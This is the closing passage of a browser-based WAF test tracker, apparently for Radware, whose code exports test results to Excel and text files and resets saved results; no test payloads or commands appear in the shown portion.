            // Style the summary sheet
            summaryWs['!cols'] = [{ width: 20 }, { width: 40 }];
            XLSX.utils.book_append_sheet(wb, summaryWs, 'Summary');
            
            // Detailed results sheet
            const detailedData = [['Category', 'Test ID', 'Test Name', 'Severity', 'Status', 'Description', 'cURL Command', 'Notes', 'Timestamp']];
            
            Object.entries(tests).forEach(([category, categoryTests]) => {
                categoryTests.forEach(test => {
                    const result = testResults[test.id];
                    detailedData.push([
                        category,
                        test.id,
                        test.name,
                        test.severity.toUpperCase(),
                        result ? result.status.toUpperCase() : 'PENDING',
                        test.description,
                        test.curl,
                        result ? result.notes || '' : '',
                        result ? new Date(result.timestamp).toLocaleString() : ''
                    ]);
                });
            });
            
            const detailedWs = XLSX.utils.aoa_to_sheet(detailedData);
            
            // Auto-size columns
            const colWidths = [15, 15, 40, 10, 10, 50, 80, 40, 20];
            detailedWs['!cols'] = colWidths.map(w => ({ width: w }));
            
            XLSX.utils.book_append_sheet(wb, detailedWs, 'Test Results');
            
            // Statistics by category sheet
            const statsData = [['Category', 'Total', 'Passed', 'Failed', 'Skipped', 'Pending', 'Completion %']];
            
            Object.entries(tests).forEach(([category, categoryTests]) => {
                const stats = {
                    total: categoryTests.length,
                    passed: categoryTests.filter(t => testResults[t.id]?.status === 'passed').length,
                    failed: categoryTests.filter(t => testResults[t.id]?.status === 'failed').length,
                    skipped: categoryTests.filter(t => testResults[t.id]?.status === 'skipped').length
                };
                stats.pending = stats.total - stats.passed - stats.failed - stats.skipped;
                stats.completion = Math.round(((stats.passed + stats.failed + stats.skipped) / stats.total) * 100);
                
                statsData.push([
                    category,
                    stats.total,
                    stats.passed,
                    stats.failed,
                    stats.skipped,
                    stats.pending,
                    stats.completion + '%'
                ]);
            });
            
            const statsWs = XLSX.utils.aoa_to_sheet(statsData);
            statsWs['!cols'] = [{ width: 25 }, { width: 10 }, { width: 10 }, { width: 10 }, { width: 10 }, { width: 10 }, { width: 15 }];
            XLSX.utils.book_append_sheet(wb, statsWs, 'Statistics');
            
            // Failed tests sheet (for quick review)
            const failedData = [['Test ID', 'Test Name', 'Category', 'Severity', 'Description', 'Notes']];
            
            Object.entries(tests).forEach(([category, categoryTests]) => {
                categoryTests.forEach(test => {
                    const result = testResults[test.id];
                    if (result && result.status === 'failed') {
                        failedData.push([
                            test.id,
                            test.name,
                            category,
                            test.severity.toUpperCase(),
                            test.description,
                            result.notes || ''
                        ]);
                    }
                });
            });
            
            if (failedData.length > 1) {
                const failedWs = XLSX.utils.aoa_to_sheet(failedData);
                failedWs['!cols'] = [{ width: 15 }, { width: 40 }, { width: 25 }, { width: 10 }, { width: 50 }, { width: 40 }];
                XLSX.utils.book_append_sheet(wb, failedWs, 'Failed Tests');
            }
            
            // Save the file
            XLSX.writeFile(wb, `Radware_WAF_Test_Report_${new Date().toISOString().split('T')[0]}.xlsx`);
            showNotification('Excel report exported successfully!');
        }

        // Export to text
        function exportToText() {
            const allTests = Object.values(tests).flat();
            const content = allTests.map(test => {
                const result = testResults[test.id];
                return `# ${test.name} (${test.id})
# Severity: ${test.severity}
# Status: ${result ? result.status.toUpperCase() : 'PENDING'}
# ${test.description}
${test.curl}
${result && result.notes ? '# Notes: ' + result.notes : ''}
`;
            }).join('\n');

            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `radware-waf-tests-${new Date().toISOString().split('T')[0]}.txt`;
            a.click();
            URL.revokeObjectURL(url);
            showNotification('Text file exported successfully!');
        }

        // Show notification
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // Reset modal functions
        function showResetModal() {
            document.getElementById('reset-modal').style.display = 'flex';
        }

        function hideResetModal() {
            document.getElementById('reset-modal').style.display = 'none';
        }

        function resetAllResults() {
            testResults = {};
            localStorage.removeItem('wafTestResults');
            updateStats();
            renderTests();
            hideResetModal();
            showNotification('All test results have been reset!');
        }

        // Initialize on load
        init();
    </script>
</body>
</html>
